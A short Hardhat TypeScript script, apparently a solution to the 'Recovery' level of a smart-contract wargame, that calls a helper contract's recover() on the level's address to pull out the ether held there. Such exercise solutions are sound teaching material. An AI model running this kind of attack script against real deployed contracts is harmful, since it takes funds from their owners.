import { ethers } from "hardhat"
import { LEVEL_ADDRESSES, PLAYER, ADDRESSES } from "../consts"
import { getSigner } from "../utils"
import { providers } from "ethers"

const pwn = async () => {
    const signer = await getSigner()
    console.log("trying")
    const hack = await ethers.getContractAt(
        "contracts/Recovery.sol:Rescuer",
        ADDRESSES.recovery,
        signer
    )

    const target = LEVEL_ADDRESSES.recovery

    const recover = await hack.recover(target)
    await recover.wait()

}

pwn()